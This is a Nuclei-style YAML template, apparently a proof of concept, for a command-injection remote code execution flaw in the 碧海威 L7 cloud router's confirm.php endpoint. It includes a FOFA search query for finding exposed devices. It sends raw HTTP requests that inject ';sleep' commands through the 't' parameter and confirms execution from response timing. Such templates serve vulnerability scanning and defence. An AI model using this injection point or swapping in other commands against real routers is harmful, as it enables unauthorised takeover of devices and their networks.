id: bihaiwei-l7-confirm-jumper-rce
info:
  name: "碧海威 L7 云路由 confirm.php 与 jumper.php 接口远程代码执行漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: product="碧海威科技-L7云路由"
      碧海威L7云路由设备confirm.php和jumper.php接口存在远程代码执行缺陷，攻击者可通过构造恶意请求执行任意系统命令，导致服务器权限被完全控制。
  tags: 碧海威L7
http:
- raw:
  - |
    GET /notice/confirm.php?t=;sleep%205 HTTP/1.1
    Host: {{Hostname}}
    Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Upgrade-Insecure-Requests: 1
    Te: trailers
    Connection: close
  - |
    GET /notice/confirm.php?t=;sleep%208 HTTP/1.1
    Host: {{Hostname}}
    Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Upgrade-Insecure-Requests: 1
    Te: trailers
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
